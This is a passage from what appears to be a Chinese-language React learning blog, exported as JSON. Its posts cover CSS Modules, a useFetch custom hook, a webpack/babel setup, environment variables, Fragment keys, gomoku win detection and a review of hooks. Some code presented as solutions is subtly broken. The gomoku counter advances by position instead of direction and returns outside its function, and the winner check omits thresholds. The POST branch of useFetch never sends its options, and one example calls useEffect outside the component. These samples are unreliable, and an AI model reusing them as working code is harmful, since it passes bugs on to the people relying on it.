Module，這種寫法還蠻有意思的，所以想記錄一下。 為什麼需要 module？在講 module 以前，我覺得先認識一下「沒有 module」的世界長什麼樣？能夠幫助你釐清 module 的用途所在。 假設我有一個 Button 元件長這樣： 123export default function Button () { return &lt;button&gt;click me&lt;/button&gt;} 如果我想幫他加上一點 style，我可能會開一隻 button.css 來寫一個給 Button 用的 className： 1234567/* button.css */.btn { color: white; background-color: dodgerblue; padding: 4px 8px; border: unset;} 接著在 Button 中引入這隻 CSS，再加上 className： 12345import \"./button.css\";export default function Button () { return &lt;button className=\"btn\"&gt;click me&lt;/button&gt;} 這樣子 Button 就會顯示我們加上的樣式了，看起來好像很合理啊？有什麼問題嗎？ 沒錯，這樣子確實可以讓 Button 吃到樣式，但有一件很重要的事情一定要搞清楚： 即便我只有在 Button 中引入 CSS 檔案，這也不代表這些樣式只會套用到 Button 上，他依然是 Global Style。 什麼意思？意思是說，假設我在別的元件中也用了 btn 這個 className，那他一樣會套用到樣式。 這個就是沒有 module 會有的問題，沒辦法產生 scope。 所以呢，CSS Module 就是用來解決 scope 的問題而誕生的一種寫法。 使用 CSS Moudle要使用 CSS Module 的話，首先我們得建立一支 *.module.css 的檔案。這邊強調一下，這個不是因為命名慣例才這樣命名，而是一定要這樣子寫才能夠啟用 module 的功能。 所以跟剛剛一樣，把 style 寫進去： 1234567/* button.module.css */.btn { color: white; background-color: dodgerblue; padding: 4px 8px; border: unset;} 接著引入的方式也會有點小不同，請看 code： 12345import style from \"./button.module.css\";export default function Button () { return &lt;button className={style.btn}&gt;click me&lt;/button&gt;} 跟剛剛不一樣的地方是我們不只是引入檔案而已，而是改用我們一般在使用 module 的方式來引入（style），接著再透過 style 來把他放入 className 裡面。 這樣子做的差別是什麼？看下面這張圖就懂了： className 會自動被加上亂碼，所以即便我現在到別的地方使用 btn 這個 className 也沒有用，因為真正被寫入 style 的 className 不是 btn，而是 button_btn_sZruf。 這是怎麼做到的？雖然我沒特別去查，不過用猜的話大概就是 React 在背後做了一些設定，只要碰到 .module.css 的 檔案就會在原本的 class 加上一串亂數，最後在包裝成一個 object 來 export 出去。 所以你最後 import 進來的東西就是已經被包裝（或想成是加工）過的 CSS 檔。 總而言之，你只要知道怎麼用？跟知道這樣做以後就能確保你的 CSS 只會作用在「引入的那個元件」中，這樣就差不多了。 以上就是 CSS Module 的使用方式。","link":"/2022/06/15/react-css-module/"},{"title":"React－來捏一個 Custom hook","text":"熟悉以後應該會很實用。 簡述最近在上 Build Web Apps with React &amp; Firebase 這門課，裡面有介紹到如何利用 hook 來建立一個 custom hook。 我覺得這東西還蠻實用的，但我還不是很熟，所以想透過這篇筆記來多做一點練習。 用 custom hook 有什麼好處？在學任何一項東西以前，試著先問自己「為什麼要用這個東西？」是比較好的觀念，才不會學了一大堆東西後卻完全不知道用途。 首先，我們拿一個最常見的例子來舉例：串接 API 最簡單的串接方式是透過 fetch，此時你的腦袋中應該會有這樣的 code： 1234567891011121314151617181920212223242526function App () { const [data, setData] = useState(null) const [error, setError] = useState(null) const [fetching, setFetching] = useState(false) useEffect(() =&gt; { setFetching(true) fetch(url) .then(response =&gt; { // 強制進入 catch 區塊 if (!response.ok) throw new Error(response.status) return response.json() }) .then(json =&gt; { setData(json) setFetching(false) }) .catch(error =&gt; { console.log(error.message) setError('Can not fetch data') setFetching(false) }) }, []) return ...} 看起來就是非常標準的寫法，這樣有什麼問題嗎？ 問這問題以前，要先問問看「你有多少元件會用到 fetch？」，如果說就只有一個 App 會用到的話當然沒什麼問題。 可是如果有很多個呢？ 那你就得在每一個元件上都寫上那段 boilerplate，這樣子聽起來就不是那麼好了吧？ 但如果我們自己寫了一個專門用來處理 fetch 的 custom hook，就可以改寫成這樣子： 12345import { useFetch } from \"hooks/useFetch\"function App () { const { data, error, fetching } = useFetch(url) return ...} 有沒有突然覺得世界變美好了 XD，這個就是 custom hook 的威力。 回歸正題，custom hook 的主要用意是用來「把邏輯抽出去，讓元件只要專注在 render 這件事情上」，可以想成是另一種 HOC（Higher Order Component） 的感覺。 實作 custom hook這邊會以剛剛的範例來實作，所以如果忘記的話可以拉回去複習。 順道一提，在寫 custom hook 前可以先思考看看「我希望最後會怎麼用這個 hook？」，這樣會讓整個思路更清晰一些。 再貼一次剛剛的 code，我希望最後會長這樣： 12345import { useFetch } from \"hooks/useFetch\"function App () { const { data, error, fetching } = useFetch(url) return ...} 也就是說這個 hook 最後得回傳 data、error 和 fetching 這三樣東西。這些東西看起來就是會「跟畫面顯示有關」，所以會用 useState 來實作。 接下來我會直接附 code，因為你看完再仔細思考一下，就會發現只是「把原本寫在元件裡的東西抽出來而已」，所以我就不解釋太多了。 12345678910111213141516171819202122232425262728import { useState, useEffect } from \"react\"export function useFetch (url) { const [data, setData] = useState(null) const [error, setError] = useState(null) const [fetching, setFetching] = useState(false) useEffect(() =&gt; { setFetching(true) fetch(url) .then(response =&gt; { // 強制進入 catch 區塊 if (!response.ok) throw new Error(response.status) return response.json() }) .then(json =&gt; { setData(json) setFetching(false) }) .catch(error =&gt; { console.log(error.message) setError('Can not fetch data') setFetching(false) }) }, []) return {data, error, fetching}} 這樣就完成囉！接著就能在其他元件透過 useFetch 來使用了。 如果有任何疑問的話都可以到我寫的 範例 來玩玩看。 延伸：我不只要 GET，我還想要 POST這個是上面的延伸練習，你可以試著先自己練習看看，要怎麼做才可以讓 useFetch 同時支援 GET 跟 POST 這兩種不同的方法。 給你一些提示： 這代表我們在用 useFetch 時得多傳入一個參數讓他知道要用 GET / POST 如果是 POST 的話會需要傳入資料（body）。這個會有兩種做法，一種是當作參數傳給 useFetch，另一種是在 useFetch 中定義新的 state。你可以想到第二種該怎麼做嗎？ 想好的話就可以往下看解答了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import { useState, useEffect } from \"react\";// 如果沒有傳，把預設值設為 GETexport function useFetch(url, method = \"GET\") { const [data, setData] = useState(null); const [error, setError] = useState(null); const [fetching, setFetching] = useState(false); // 新增一個用來儲存資料的 state const [options, setOptions] = useState(null); // 為了讓元件可以更新 options，新開一個 setter const setPostData = (data) =&gt; { setOptions({ method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify(data) }); }; useEffect(() =&gt; { // 根據 options 來決定執行哪一段 fetch if (method === \"GET\") { setFetching(true); fetch(url) .then((response) =&gt; { if (!response.ok) throw new Error(response.status); return response.json(); }) .then((json) =&gt; { setData(json); setFetching(false); }) .catch((error) =&gt; { console.log(error.message); setError(\"Can not fetch data\"); setFetching(false); }); } if (method === \"POST\" &amp;&amp; options) { setFetching(true); fetch(url) .then((response) =&gt; { if (!response.ok) throw new Error(response.status); return response.json(); }) .then((json) =&gt; { setData(json); setFetching(false); }) .catch((error) =&gt; { console.log(error.message); setError(\"Can not send request\"); setFetching(false); }); } }, [url, options]); return { data, error, fetching, setPostData };} 簡單來說就是判斷 method 來執行對應的 fetch 就行了，不太懂的話可以到這邊來看範例。 另外如果你覺得這樣子很攏長（fetch 的部分），想包裝成 function 的話絕對沒問題，但這邊就不示範了，留給你自己來練習。","link":"/2022/06/17/react-custom-hook/"},{"title":"從零開始建立一個 React 開發環境","text":"雖然流程上麻煩了點，但能幫助你理解背後的原理。 簡述雖然要建立一個 React 環境可以用 create-react-app 來一鍵完成，但是我覺得還是要自己跑一次這背後的流程會更清楚一些。 簡單來說 React 的背後主要就是兩個東西： webpack babel webpack 是用來處理 import 跟 require 的語法，而 babel 則是用來處理 ES 版本問題跟 React 內部的東西（JSX）。 webpack首先安裝 webpack 1npm install webpack webpack-cli 接著新增設定檔： 123456789// webpack.config.jsconst path = require(\"path\");module.exports = { entry: \"./src/index.js\", output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.js\" }} 接著設定 package.json： 12345\"scripts\": { \"start\": \"webpack --mode development\", // 開發環境 \"build\": \"webpack --mode production\", // 生產環境 \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"} 最後確認打包出來的 bundle.js 是可以運作的就沒問題了。 babel首先安裝該裝的東西： 1npm install @babel/core babel-loader @babel/preset-env 建立 .babelrc： 123{ \"presets\": [\"@babel/preset-env\"]} 去 webpack 設定 loader： 12345678910111213141516171819202122const path = require('path');module.exports = { entry: \"./src/index.js\", output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.js\" }, module: { rules: [ { // 所有 .js 檔 test: /\\.js$/, // 排除 node_modules exclude: /node_modules/, use: { loader: \"babel-loader\" } } ] }} 這邊的結構有點巢，可以看成是 rules 有很多個所以是 Array，而每一個內容都是一包 Object，會指定要對哪些資源用哪些 loader。 把 React 串接起來一樣先把該裝的東西裝起來： 1npm install react react-dom @babel/preset-react 然後調整一下 .babelrc： 123{ \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"]} 接下來建立一個簡單的 react component： 1234567import React, { Component } from \"react\";export default class App extends Component { render() { return &lt;h1&gt;Hello PeaNu&lt;/h1&gt; }} 然後到 index.js 引入： 123456import React from \"react\";import { createRoot } from \"react-dom/client\";import App from \"./App\";const root = createRoot(document.getElementById(\"root\"))root.render(&lt;App /&gt;); 別忘了到 HTML 裡面加上 &lt;div id=\"root\"&gt;&lt;/div&gt;。 接下來一樣打包後確認 React 是否能正常運作， 後續優化1. 幫 bundle 加上 hash 如果檔案名稱都沒變的話，瀏覽器會有 cache 機制，導致可能不是用到最新的 bundle，所以就要到 webpack 調整一下設定，讓它自動幫我們加上 hash 值 1234output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.[hash].js\" // 加上 [hash]}, 但是除此之外，我們還得處理 HTML 引入 &lt;script&gt; 的問題，畢竟我們不可能每次都手動去改吧。 這邊要利用 webpack 提供的 plug-in，簡單來說就是幫你自動產生 HTML 檔。 一樣先安裝起來： 1npm install html-webpack-plugin 然後設定 webpack.config.js： 1234567891011121314151617181920212223242526272829const path = require('path');// 引入套件const HtmlWebpackPlugin = require(\"html-webpack-plugin\");module.exports = { entry: \"./src/index.js\", output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.[hash].js\" }, module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: { loader: \"babel-loader\" } } ] }, // 新增要用的 plugin plugins: [ new HtmlWebpackPlugin({ template: \"./index.html\" }) ]} 附註：記得是傳入一個物件，不是直接傳路徑字串，提醒一下當初踩到的雷！ 2. 加上 dev-server 因為每次改東西都要重新 build 實在太麻煩了，所以要用 dev-server 來達成 hot reload 的功能。 一樣把該裝的裝起來： 1npm install webpack-dev-server 接著一樣改一下 package.json 的指令，只要一句話就好： 123\"scripts\": { \"start\": \"webpack-dev-server --mode development --open --hot\" } 接著執行指令，沒意外的話能成功開啟 hot reload 的效果了。 以上就是基本的 React 環境建置，到這邊以後就可以正式進行開發了。","link":"/2022/05/06/react-environment-setup/"},{"title":"React-Environment-Variable","text":"學起來會很方便。 簡述在進入職場前，環境變數對我來說主要是拿來儲存 API Key 之類的東西，一直到了最近我才理解環境變數其實還有另一個用途是「拿來區分不同環境」。 舉例來說，最常見的差異是開發環境和生產環境上的 API 端口可能會不一樣，這時候就很適合用環境變數來設定端口的值。又或者說在不同環境上可能會想呈現一些不同的資訊，這時候也很適合用環境變數來設置。 總而言之，這篇主要是想紀錄一下在 React 上如何使用環境變數。 NODE_ENV當我們在用 npm run start、npm run build、 npm run test 時其實預設會自動來帶入 NODE_ENV 這個環境變數，而這個值會顯示目前的環境是什麼： development production test 換句話說，其實你可以把 react 預設給你的指令想成是這樣： 123456\"scripts\": { \"start\": \"NODE_ENV=development react-scripts start\", \"build\": \"NODE_ENV=production react-scripts build\", \"test\": \"NODE_ENV=test react-scripts test\", \"eject\": \"react-scripts eject\"} 只是這些值是不能修改的，所以在實際情況中你不會看到 NODE_ENV=xxxx 這樣的設定。 來舉個例子，假設我們有底下的 Code： 12345678910function App() { return ( &lt;div className='App'&gt; &lt;header className='App-header'&gt; &lt;img src={logo} className='App-logo' alt='logo' /&gt; &lt;p&gt;Env: {process.env.NODE_ENV}&lt;/p&gt; &lt;/header&gt; &lt;/div&gt; )} 在 Dev 環境（npm run start）上跑的結果會是： 在 Production 環境（npm run build）上跑的結會是： 透過終端上輸入 Env 變數假設目前的 Code 長這樣： 12345678910function App() { return ( &lt;div className='App'&gt; &lt;header className='App-header'&gt; &lt;img src={logo} className='App-logo' alt='logo' /&gt; &lt;p&gt;Env: {process.env.REACT_APP_DEMO_CODE}&lt;/p&gt; &lt;/header&gt; &lt;/div&gt; )} 為了讀取到 REACT_APP_DEMO_CODE 這個變數，我們可以在執行 react-script 之前把變數寫進去： 或者是寫在 package.json 中（兩個背後的執行方式是一樣的）： 123456\"scripts\": { \"start\": \"REACT_APP_DEMO_CODE=PeaNu react-scripts start\", \"build\": \"react-scripts build\", \"test\": \"react-scripts test\", \"eject\": \"react-scripts eject\"} 這邊的執行結果長這樣： 透過 .env 檔案來輸入變數Create React App 預設會自動存取這幾個 .env 檔案： .env：可以在所有環境中存取，除了 test .env.local：可以在所有環境中存取，除了 test（更強的優先權） .env.development, .env.test, .env.production：可以在指定的還境中存取 .env.development.local, .env.test.local, .env.production.local：可以在指定的還境中存取（更強的優先權） 所以你只要建立符合這些名稱的檔案以後，就可以直接在專案中存取到這些 Env 變數。 會分成這麼多的原因主要是為了針對不同環境來讀取不同的 Env 變數，等一下會在解釋他們實際的差別，這邊先來看個示範。 首先在根目錄建立 .env 檔案，並填入底下內容： 1REACT_APP_DEMO_CODE='Hello PeaNu' 接著就能存取到這個變數了： 順道一提，因為這邊示範用的是 .env 檔案，所以不管是 development 或 production 都可以存取這個變數。 所以這幾個檔案的差別在哪？我們先來看官方文件，它其實有提到每個 .env 檔案之間的「優先權」： npm start: .env.development.local, .env.local, .env.development, .env npm run build: .env.production.local, .env.local, .env.production, .env npm test: .env.test.local, .env.test, .env (note .env.local is missing) 附註：（優先順序是左邊 &gt; 右邊） 舉例來說，如果你的專案同時存在 .env 和 .env.local 時，在 npm run start 的情境下會採用 env.local 的內容，.env 就不會被存取到，其他的也是以此類推。 存取 package.json 中的內容假設我們的 package.json 有這些內容： 1234567{ \"name\": \"my-awesome-project\", \"version\": \"0.1.0\", \"homepage\": \".\", \"private\": true // ...} 如果我們想透過 .env 來存取這些內容的話，可以用 $ 來存取變數： 12REACT_APP_VERSION=$npm_package_versionREACT_APP_NAME=$npm_package_name 接著在 Code 裡面存取這些 Env 變數就可以拿到對應的值了： 12345678910111213function App() { return ( &lt;div className='App'&gt; &lt;header className='App-header'&gt; &lt;img src={logo} className='App-logo' alt='logo' /&gt; &lt;p&gt;Current Version: {process.env.REACT_APP_VERSION}&lt;/p&gt; &lt;p&gt;Current Name: {process.env.REACT_APP_NAME}&lt;/p&gt; &lt;/header&gt; &lt;/div&gt; )}export default App 自定義 .env 檔案如果你不想要用預設提供的那些 .env 檔案名稱（.env.production、 .env.development 等等那些），而是想自己取名字，例如說我想建立 .env.dev 和 .env.demo 來分別給 Dev / Demo 環境使用。 1234// .env.devREACT_APP_VERSION=$npm_package_versionREACT_APP_NAME=$npm_package_nameREACT_APP_MESSAGE='Welcome to dev envioment' 1234// .env.demoREACT_APP_VERSION=$npm_package_versionREACT_APP_NAME=$npm_package_nameREACT_APP_MESSAGE='Welcome to demo envioment' 那麼現在會碰到的問題是如果沒告訴 react-scripts 的話，他都吃不到這兩個 .env 檔案的內容。 這時候就可以把 npm script 的部分修改成底下這樣： 12345678{ \"scripts\": { \"start\": \"sh -ac '. ./.env.dev; react-scripts start'\", \"build\": \"sh -ac '. ./.env.demo; react-scripts build'\", \"test\": \"react-scripts test\", \"eject\": \"react-scripts eject\" }} 附註：注意 sh -ac 後面要執行的指令要放在單引號（'） 中 關於這個 sh -ac 的意思我不想解釋太深，但我自己的理解是：透過 sh 來執行一段 shell。因為我們是直接呼叫 shell，所以有能力把 .env 帶入 process 物件中，並且執行 react-scripts，詳細可以參考這篇討論。 如果上面聽不懂的話也沒關係，你只要知道透過它我們就可以把指定的 .env 來丟給 react-scripts 執行就好了。 設定好以後執行 npm run start 會得到這樣的結果： 執行 npm run build 以後會得到這樣的結果：","link":"/2022/10/26/react-environment-variable/"},{"title":"React Fragment－以前沒發現到的小技巧","text":"解惑了。 簡述寫過 React 的人應該都知道，一個 Component 只可以用一個根元素，像這樣： 12345678function Component () { return ( &lt;div&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;PeaNu's party time&lt;/p&gt; &lt;/div&gt; )} 如果寫成這樣的話就會報錯： 123456function Component () { return ( &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;PeaNu's party time&lt;/p&gt; )} 但如果外面不想包一層 &lt;div&gt; 的話怎麼辦？這時候最簡單的作法就是改用 React Fragment 來包住： 12345678function Component () { return ( &lt;&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;PeaNu's party time&lt;/p&gt; &lt;/&gt; )} 可是如果是「渲染列表」的情況下，這樣會有一點問題： 1234567891011function Component () { return ( {items.map(item =&gt; ( &lt;key={item.id}&gt; &lt;ul&gt; &lt;li&gt;{item.value}&lt;/li&gt; &lt;/ul&gt; &lt;/&gt; ))} )} 當要傳入 key 這個 props 時就沒辦法用 &lt;&gt;&lt;/&gt; 的方式來寫。 但如果還是想用 Fragment 的話怎麼辦？其實可以改寫成這樣： 1234567891011function Component () { return ( {items.map(item =&gt; ( &lt;React.Fragment key={item.id}&gt; &lt;ul&gt; &lt;li&gt;{item.value}&lt;/li&gt; &lt;/ul&gt; &lt;/React.Fragment&gt; ))} )} 嗯！這個就是這篇文章想說的： React.Fragment 是可以有 props 的，只是不可以用在縮寫的形式。","link":"/2022/06/06/react-fragment-props/"},{"title":"React 關於五子棋判斷輸贏的思路","text":"只是想記一下，因為我想了好久卻沒想出來。 簡述前幾天剛做完 五子棋 這份作業。 但因為我想了很久都想不出「斜線」的解法，所以特地開這篇來記錄一下這個很棒的解法。 思路解釋先說一下我原本的思路吧。 我的想法是透過「整個棋盤」來判斷輸贏，講白話一點就是「每一次都把整副棋盤看過一遍」，找出誰達成連線就誰就贏了。 所以就寫了這樣的 code（只是大概寫一下概念）： 123456789101112// 附註：board 是一個二維陣列function calculateWinner (board) { // 遍歷每一個 row for(let i=0; i&lt;board.length; i++) { // 先看橫線 checkHorizontal(board[i]); // 再看直線 checkVertiacl(board[i]); // 接著看斜線，但我沒想出來 }}const winner = calculateWinner(board); 總之，這個方法顯然不是很好，也不聰明。所以接著來看看另一種思路吧，這個思路只要想清楚以後就會覺得很直覺。 首先，分出勝負的時機點一定是出現在「下了某一支棋」的情況，這代表什麼？代表其實只需要看這隻棋的附近是不是有可以跟它湊成連線的棋就好，這樣就不用整個看過一遍了。 如果你的棋盤是用二維陣列來存的，就應該會有 x 軸和 y 軸這兩個資訊，接著只要給它一個「方向」就好，告訴它我要往哪個方向去看，像這樣： 知道方向以後，只要用一個迴圈就可以達成搜尋的效果了： 123456789101112131415161718192021222324function countTotal(board, currentX, currentY, directionX, directionY) { // 現在要檢查的棋子顏色 const now = board[currentY][currentX]; let tempX = currentX; let tempY = currentY; let total = 0; do { // 檢查下一個棋子 tempX += currentX; tempY += currentY; // 超出棋盤範圍就不用在判斷了（Y 軸的部分） // 至於 X 軸不寫是因為得透過 board[y][x] 才能取得，多加一層 &amp; board[tempY][tempX] 的意義不大 // 反正後面跟 now 比較時一定會是 false if (board[tempY] &amp;&amp; board[tempY][tempX] === now) { total++; } else { break; } } while (true)}// 回傳連續次數return total; 接下來就只要對每個方向做計算就好了： 123456789101112131415function calculateWinner (board, x, y) { if ( countTotal(board, x, y, 0, -1) &gt;= 4 || countTotal(board, x, y, 0, 1) || countTotal(board, x, y, -1, 0) &gt;= 4 || countTotal(board, x, y, 1, 0) || countTotal(board, x, y, 1, -1) &gt;= 4 || countTotal(board, x, y, -1, 1) || countTotal(board, x, y, 1, 1) &gt;= 4 || countTotal(board, x, y, -1, -1) || ) { // 有贏家的話 return board[y][x] } // 平手的情況 if (board.every(row =&gt; row.every(col =&gt; col))) { return 'draw' }} 關於平手的部分如果看不太懂，可以這樣想就好 board.every(true / false)，裡面放 true 就會回傳 true，反之則 false。 而我們在裡面做的事情只是去檢查 row 裡面的 col 是不是都有值，如果都有就會回傳 true 代表棋盤已經放滿了，所以是平手。 以上就是判斷輸贏的思路，希望我哪天也能只靠自己就想出這種解法 QQ","link":"/2022/04/19/react-gomoku-thinking/"},{"title":"React 重新複習 hooks","text":"剛看完官方文件，來留個紀錄。 簡述之前有針對各個 hooks 寫過系列筆記： React 的第一個 hook：useState React 的第二個 hook：useRef React 的第三個 hook：useEffect React 的第四個 hook：useLayoutEffect React 的第五個 hook：memo React 的第六個 hook：useCallback React 的第七個 hook：useMemo React 的第八個 hook：useContext 與 createContext 但當時還沒有仔細看過官方文件，可能寫得不是很完整，所以這篇會寫得更詳細一些。 其他補充舉凡像是 setState 或 dispatch 等等這些從 hook 回傳的 function，都不會在 re-render 的時候被改變，所以才可以不用在 useEffect 或 useCallback 把它們傳到 dependencies 中。 useState 用來產生「state」的 function 回傳值有兩個，第一個是 state 的值，第二個是改變 state 時會用到的 setter： 1const [counter, setCounter] = useState(0); 所以要在一個元件顯示 state 的話只要： 1&lt;button&gt;{counter}&lt;/button&gt; 就會看到一個 0 的按鈕了。 而要改變 state 的話就要透過 setter 來改變，像這樣： 12// 用 setCounter 來更新 state&lt;button onClick={() =&gt; setCounter(prev =&gt; prev + 1)}&gt;{counter}&lt;/button&gt; 這樣子每點一下按鈕 counter 的值就會加一。 另外我想補充一個觀念，就是每次 re-render 時 state 會怎麼運作？ 像我之前就有想過，如果 re-render 等於重新執行一次 function component 的內容的話，那裡面的 useState 不就又會重新執行一次了嗎？這樣的話 state 不就會又變成最開始的初始值了？（0） 列個流程，應該會比較好理解我的意思： 第一次 render 執行 useState(0)，counter 的初始值為 0 點按鈕，更新 state 讓 counter 變成 1，觸發 re-render 再執行一次 useState(0)，counter 的值為 0？還是 1？ 我們當然知道答案會是 1，但這是為什麼？原來官方文件裡面有提到： During subsequent re-renders, the first value returned by useState will always be the most recent state after applying updates. 簡單來說 re-render 時 useState 確實會被重新執行，但它會確保第一個回傳值（也就是 state）是最新的那個值。 最後補充幾個其他特性： 更新 state 的方式有兩種，直接傳值的叫做「normal form」，透過 prev 的叫做「functional form」，如果新的 state 必須用 prev 值來計算的話建議用後者比較安全 如果新的 state 跟 目前的 state 一樣，就不會觸發 re-render 在 hook 裡面就算只有要改 state 的某個部分，也必須把完整的 state 給放進去，而不是像 class component 一樣可以只寫要改的地方就好（這個很重要哦） 如果 state 的初始值得用複雜計算來求出，可以在 useState 裡改傳進一個 function，這個只會在第一次 render 的時候被執行，後續的不會，技術上稱為「Lazy initial state」 假設一次更新兩個 state，React 會自動合在一起，變成只 re-render 一次。在 18.0 以前只有 Event handler 裡面的更新 state 會有這效果，但這之後就不侷限了，想看範例可以參考這裡 useEffect就跟課程講的一樣，意思是： render 完以後想做什麼？ 為什麼會取名為「Effect」？其實是因為 React 希望你用這個 hook 來處理「side effect（副作用）」，意思是指跟 React 本身無關的事情，像是「發 API 拿資料」、「儲存到 storage」等等。 這些 effect 雖然很重要（因為有可能會改變內容），但對 React 在渲染 Component 的時後來說是不重要的，所以才會說這是 side effect。 總之呢，不要把一些跟 Component 沒有直接關係的東西寫在裡面，像這樣： 123function Component() { fetch('...');} 而是要這樣： 12345678function Component() { return (...)}// render 完以後才去發 APIuseEffect(() =&gt; { fetch('...')}) 不過 useEffect 預設是每次 render 以後都會被執行，所以更準確的作法是加上第二個參數（dependencies）來告訴它「當某某值改變的時候再幫我執行這個 effect」： 123456789function Component() { return (...)}// 不管傳什麼第一次都一定會被執行// 所以這邊傳空的代表我只希望他被執行一次useEffect(() =&gt; { // render 完以後才去發 API fetch('...')}, []) 基本上呢，只要是出現在 useEffect 裡的 props 或 state，都應該要放在 dependencies 裡面，否則當值改變時它們還是會停留在舊的那個值，這個要多注意一下。 接著做一個補充，useEffect 每次在執行 side effect 以前會先把上一次的 effect 給清掉，這個階段叫做「clean up effect」，這樣做是為了確保「memory weak（簡單來說就是記憶體浪費吧？）」的問題。 另外 useEffect 裡面其實還可以在回傳另一個 function，它會在 component 從畫面上移除前給執行，像這樣： 12345678function Message() { useEffect(() =&gt; { // render 以後執行 console.log(\"Message has rendered.\"); // 回傳 function，被移除前會執行 return () =&gt; console.log(\"before Message remove.\"); });} 想看實際效果可以到 這邊 看。 useContext 把 props 聚集到一個地方管理 簡單來說就是這樣。 舉個例子，當你的 props 要通過「很多層來傳遞時」，可能就會寫出這樣的東西： 12345678910111213141516171819202122232425262728293031323334353637383940414243// 要往下傳遞的 propsconst theme = { light: { bg: \"white\", color: \"black\", }, dark: { bg: \"black\", color: \"white\", },};// 第三層，終於拿到 propsfunction Content({ theme }) { return ( &lt;div style={{ backgroundColor: theme.bg, color: theme.color, }} &gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Odio eos neque explicabo soluta excepturi impedit aperiam necessitatibus fugiat officia recusandae quidem consequuntur, minus facere suscipit quam asperiores ipsum. Impedit, facilis? &lt;/div&gt; );}function Wrapper({ theme }) { // 第二層 return &lt;Content theme={theme} /&gt;;}function App() { const [isDarkmode, setIsDarkMode] = useState(true); return ( &lt;div className=\"App\"&gt; // 第一層 &lt;Wrapper theme={theme.dark} /&gt; &lt;/div&gt; );} 有同學用說這樣的場景就跟「接力棒」很像，我覺得這還蠻貼切的 XD 但如果改用 useContext 和 createContext 就能大大節省掉這個困擾： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const theme = { light: { bg: \"white\", color: \"black\" }, dark: { bg: \"black\", color: \"white\" }};// 1. 建立 Contextconst ThemeContext = createContext(null);function Content() { // 3. 取得 Context 的值 const theme = useContext(ThemeContext); return ( &lt;div style={{ backgroundColor: theme.bg, color: theme.color }} &gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Odio eos neque explicabo soluta excepturi impedit aperiam necessitatibus fugiat officia recusandae quidem consequuntur, minus facere suscipit quam asperiores ipsum. Impedit, facilis? &lt;/div&gt; );}function Wrapper() { return &lt;Content /&gt;;}function App() { const [isDarkmode, setIsDarkMode] = useState(true); return ( // 2. 建立 Provider 和要提供的值（value） &lt;ThemeContext.Provider value={isDarkmode ? theme.dark : theme.light}&gt; &lt;div className=\"App\"&gt; &lt;Wrapper /&gt; // 按下按鈕時切換主題 &lt;button onClick={() =&gt; setIsDarkMode((prev) =&gt; !prev)}&gt; switch theme &lt;/button&gt; &lt;/div&gt; &lt;/ThemeContext.Provider&gt; );}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\")); 想看效果的話可以到 這裡 看。 總之呢，像這樣把 props 集中到 Context 來處理會好管理很多，也不用像剛剛那麼 hardcode 每一層都得傳一遍。 useReducer 去學 redux 吧，畢竟這跟它有關。 簡單來說就是用來取代 useState 的另一種 hook，會需要它是因為當 state 很多或很複雜的時候，要傳遞各種 props 也會變得很麻煩，所以才會用這種類似「flux」方式來集中管理。 這邊先大概知道怎麼用就好，其他的等學 Redux 再說吧！ 1234567891011121314151617181920212223242526272829// state 初始值const initialState = { count: 0 };// reducer，用來管理 state 的工具人// 會根據 action 來更新 state const reducer = (state, action) =&gt; { switch (action.type) { case \"increment\": return { count: state.count + 1 }; case \"decrement\": return { count: state.count - 1 }; default: throw new Error(); }};function App() { // 使用它，要記得傳入前面寫的 reducer 跟 state const [state, dispatch] = useReducer(reducer, initialState); return ( &lt;div className=\"App\"&gt; count: {state.count} // 接著透過 dispatch 跟 reducer 說我想做什麼 &lt;button onClick={() =&gt; dispatch({type: \"increment\"})}&gt;+&lt;/button&gt; &lt;button onClick={() =&gt; dispatch({type: \"decrement\"})}&gt;-&lt;/button&gt; &lt;/div&gt; );} 效果可以到 這邊 看。 總之，這樣的好處是不用在透過 props 把更新 state 的 callback 傳給子元件，子元件只要先 useReducer，再透過 dispatch 來指派任務就完事了。 useCallback 把 function 記起來。 這個是拿來做優化時比較會用到。舉例來說，我們可能會在一個 Component 中定義 function： 12345function App() { const [someState, setSomeState] = useState(\"hello\"); const doSomething = () =&gt; console.log(someState); ...} 但這樣的問題在於，不管怎麼樣每次 re-render 的時候 doSomething 都會在重新宣告一次，即使 someState 沒有變也一樣，這樣不是很浪費嗎？明明沒有必要？ 所以 useCallback 就是用來解決這個問題的，它可以把一個 function 給記住，你只要告訴它「xxx 改變的時候再幫我重新宣告就好了」。 這邊附上一個用來驗證的範例： 1234567891011121314151617181920function App() { const [value, setValue] = useState(\"\"); // 一個有用 useCallback，一個沒有 const logHello = () =&gt; console.log(\"Hello\"); const logHelloMemorized = useCallback(logHello, []); // 把一開始的 reference 記起來 // （利用 useRef 在 re-render 後不會變的特性） const refLogHello = useRef(logHello); const refLogHelloMemorized = useRef(logHelloMemorized); return ( &lt;div className=\"App\"&gt; &lt;div&gt;Is same logHello: {refLogHello.current === logHello ? \"Yes\" : \"No\"}&lt;/div&gt; &lt;div&gt;Is same logHelloMemorized: {refLogHelloMemorized.current === logHelloMemorized ? \"Yes\" : \"No\"}&lt;/div&gt; &lt;input value={value} onChange={(e) =&gt; setValue(e.target.value)} /&gt; &lt;/div&gt; );} 這邊刻意放了一個 &lt;input&gt;，目的是要讓我在輸入文字時觸發 re-render。 所以在 re-render 時，logHello 理應就會被重新宣告一次，變成一個新的 function，而 logHelloMemorized 不會，因為它有用 useCallback 包住。 建議你到我寫的 範例 去試試看，再來思考我這邊說的意思應該就能理解了。 至於 dependencies 該傳什麼？就跟 useEffect 的邏輯差不多，只要是 function 裡會用到的 state 或 props 幾乎都要放進去，不然就很容易出現 bug。 為什麼？因為 function 裡的值是舊的。 useMemo 把回傳值給記住 跟 useCallback 一樣是用來優化的 hook。 